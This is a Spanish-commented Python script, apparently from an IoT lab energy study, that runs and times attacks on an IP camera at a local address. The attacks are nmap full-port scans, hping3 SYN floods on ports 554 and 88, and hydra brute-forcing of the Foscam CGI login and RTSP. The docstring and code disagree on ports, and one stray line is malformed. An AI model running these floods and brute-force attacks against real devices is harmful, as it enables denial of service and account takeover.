#!/usr/bin/env python3
"""
attack_timer_camera.py
----------------------

Ataques:
  1. Nmap T3  escaneo completo -p- (moderado)
  2. Nmap T4  escaneo completo -p- (agresivo)
  3. Nmap T5  escaneo completo -p- (insano)
  4. hping3 flood p554: SYN flood RTSP 30s
  5. hping3 flood p8080 : SYN flood HTTP-proxy 30s
  6. Hydra CGI t16: brute force API CGI Foscam puerto 88, (Ataque sin consumo energetico visible se deja solo para mantener estructura estandar de scripts)
  

USO:
  sudo python3 attack_timer_camera.py 
"""

import argparse
import csv
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path



TARGET_DEFAULT    = "192.168.0.101"
CAM_USER          = "ipcam"
CAM_PASS          = "ipcam123"
WORDLIST          = "/usr/share/wordlists/rockyou.txt"
FLOOD_DURATION    = 60    
HYDRA_TIMEOUT     = 60    
HYDRA_THREADS     = 16
PAUSE_BETWEEN     = 60    

─

def build_attack_plan(target: str, flood_duration: int) -> list[dict]:
    attacks = []

    
    for t in range(3, 6):
        attacks.append({
            "id":          f"nmap_T{t}",
            "label":       f"Nmap Port Scan T{t}",
            "attack_type": "port_scan",
            "tool":        "nmap",
            "cmd":         [
                "nmap", f"-T{t}", "-p-", "--open", "-n",
                "--defeat-rst-ratelimit", target
            ],
            "kill_after":  None,
            "timeout":     None,
        })

  
    attacks.append({
        "id":          "hping3_synflood_p554",
        "label":       f"SYN Flood RTSP (puerto 554) — {flood_duration}s",
        "attack_type": "dos_synflood",
        "tool":        "hping3",
        "cmd":         ["hping3", "-S", "--flood", "-V", "-p", "554", target],
        "kill_after":  flood_duration,
        "timeout":     flood_duration + 5,
    })


    attacks.append({
        "id":          "hping3_synflood_p88",
        "label":       f"SYN Flood HTTP-CGI (puerto 88) — {flood_duration}s",
        "attack_type": "dos_synflood",
        "tool":        "hping3",
        "cmd":         ["hping3", "-S", "--flood", "-V", "-p", "88", target],
        "kill_after":  flood_duration,
        "timeout":     flood_duration + 5,
    })


    attacks.append({
        "id":          f"hydra_cgi_t{HYDRA_THREADS}",
        "label":       f"Hydra BruteForce CGI Foscam t={HYDRA_THREADS} (60s max)",
        "attack_type": "brute_force_http",
        "tool":        "hydra",
        "cmd":         [
            "hydra",
            "-l", CAM_USER,
            "-P", WORDLIST,
            "-s", "88",
            "-t", str(HYDRA_THREADS),
            "-f",
            f"http-get://{target}/cgi-bin/CGIProxy.fcgi?cmd=logIn&usrName=^USER^&pwd=^PASS^:logInResult>-1<",
        ],
        "kill_after":  None,
        "timeout":     HYDRA_TIMEOUT,
    })

    attacks.append({
        "id":          f"hydra_rtsp_t{HYDRA_THREADS}",
        "label":       f"Hydra BruteForce RTSP t={HYDRA_THREADS} (60s max)",
        "attack_type": "brute_force_rtsp",
        "tool":        "hydra",
        "cmd":         [
            "hydra",
            "-l", CAM_USER,
            "-P", WORDLIST,
            "-s", "554",
            "-t", str(HYDRA_THREADS),
            "-f",
            f"rtsp://{target}/",
        ],
        "kill_after":  None,
        "timeout":     HYDRA_TIMEOUT,
    })

    return attacks



def run_and_time(attack: dict) -> dict:
    label      = attack["label"]
    cmd        = attack["cmd"]
    kill_after = attack["kill_after"]
    timeout    = attack["timeout"]

    print(f"\n{'='*62}")
    print(f"  [*] INICIO : {label}")
    print(f"      CMD    : {' '.join(cmd)}")
    if kill_after:
        print(f"      Duración forzada : {kill_after}s → SIGTERM")
    if timeout and not kill_after:
        print(f"      Timeout máximo   : {timeout}s → SIGKILL")
    print(f"{'='*62}")

    ts_start  = datetime.now(timezone.utc).isoformat()
    t0        = time.perf_counter()
    exit_code = None
    status    = "ok"
    error_msg = ""
    proc      = None

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )

        if kill_after:
            # Flood: matar después de N segundos
            time.sleep(kill_after)
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=3)
            except (subprocess.TimeoutExpired, ProcessLookupError):
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except ProcessLookupError:
                    pass
            exit_code = proc.returncode
            status    = "killed_after_duration"
        else:
            # Hydra/Nmap: espera que termine o timeout
            proc.wait(timeout=timeout)
            exit_code = proc.returncode

    except subprocess.TimeoutExpired:
        print(f"  [!] Timeout de {timeout}s alcanzado — terminando proceso...")
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            proc.wait(timeout=3)
        except (subprocess.TimeoutExpired, ProcessLookupError):
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except ProcessLookupError:
                pass
        exit_code = -9
        status    = "timeout_killed"

    except FileNotFoundError:
        exit_code = -1
        status    = "tool_not_found"
        error_msg = f"{cmd[0]} no encontrado — verifica instalación"
        print(f"  [!] {error_msg}")

    except PermissionError as e:
        exit_code = -2
        status    = "permission_denied"
        error_msg = str(e)
        print(f"  [!] PERMISO DENEGADO — ejecuta con sudo")

    duration_s = round(time.perf_counter() - t0, 4)
    ts_end     = datetime.now(timezone.utc).isoformat()

    print(f"  [✓] FIN    : {label}")
    print(f"      Duración : {duration_s:.4f}s  |  exit_code: {exit_code}  |  estado: {status}")

    return {
        "id":           attack["id"],
        "label":        label,
        "attack_type":  attack["attack_type"],
        "tool":         attack["tool"],
        "target":       TARGET_DEFAULT,
        "command":      " ".join(attack["cmd"]),
        "start_utc":    ts_start,
        "end_utc":      ts_end,
        "duration_s":   duration_s,
        "exit_code":    exit_code,
        "status":       status,
        "error":        error_msg,
    }


CSV_FIELDS = [
    "id", "label", "attack_type", "tool", "target", "command",
    "start_utc", "end_utc", "duration_s", "exit_code", "status", "error",
]


def save_csv(record: dict, path: Path) -> None:
    write_header = not path.exists()
    with open(path, "a", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDS)
        if write_header:
            writer.writeheader()
        writer.writerow(record)
    print(f"  [✓] CSV  → {path}")


def save_json(record: dict, path: Path) -> None:
    existing = []
    if path.exists():
        with open(path, "r", encoding="utf-8") as f:
            try:
                existing = json.load(f)
            except json.JSONDecodeError:
                existing = []
    existing.append(record)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(existing, f, indent=2, ensure_ascii=False)
    print(f"  [✓] JSON → {path}")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Temporiza ataques IoT contra Cámara IP y guarda en CSV/JSON.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--target",         default=TARGET_DEFAULT, help="IP de la cámara")
    p.add_argument("--flood-duration", type=int, default=FLOOD_DURATION,
                   help="Segundos de SYN flood antes de SIGTERM")
    p.add_argument("--output-dir",     default="./results",    help="Directorio de salida")
    return p.parse_args()


def main() -> None:
    args       = parse_args()
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    session_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    csv_path   = output_dir / f"camera_attacks_{session_ts}.csv"
    json_path  = output_dir / f"camera_attacks_{session_ts}.json"

    print(f"\n{'#'*62}")
    print(f"  ATTACK TIMER — Cámara IP IoT Lab")
    print(f"  Sesión  : {session_ts}")
    print(f"  Target  : {args.target}")
    print(f"  Puertos : 88 (CGI panel), 554 (RTSP), 443, 888, 8080, 60457")
    print(f"  Usuario : {CAM_USER}")
    print(f"  Salida  : {output_dir}")
    print(f"{'#'*62}")

    if os.geteuid() != 0:
        print("\n  [!] Se requiere root para hping3 y nmap -p-")
        print("      Ejecuta: sudo python3 attack_timer_camera.py\n")
        sys.exit(1)

    if not Path(WORDLIST).exists():
        print(f"\n  [!] Wordlist no encontrada: {WORDLIST}")
        print("      sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n")
        sys.exit(1)

    attacks     = build_attack_plan(args.target, args.flood_duration)
    all_records = []

    for i, attack in enumerate(attacks):
        record = run_and_time(attack)
        all_records.append(record)
        save_csv(record,  csv_path)
        save_json(record, json_path)

        if i < len(attacks) - 1:
            print(f"\n  [~] Pausa {PAUSE_BETWEEN}s — estabilización energética...")
            time.sleep(PAUSE_BETWEEN)
            
    print(f"\n{'='*62}")
    print("  RESUMEN DE SESIÓN — CÁMARA IP")
    print(f"{'='*62}")
    print(f"  {'ID':<30} {'Duración (s)':>12}  Estado")
    print(f"  {'-'*58}")
    for r in all_records:
        print(f"  {r['id']:<30} {r['duration_s']:>12.4f}  {r['status']}")
    total = sum(r["duration_s"] for r in all_records)
    print(f"  {'-'*58}")
    print(f"  {'TOTAL':<30} {total:>12.4f}s")
    print(f"\n  CSV  → {csv_path}")
    print(f"  JSON → {json_path}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrumpido (Ctrl+C). Resultados parciales guardados.")
        sys.exit(130)
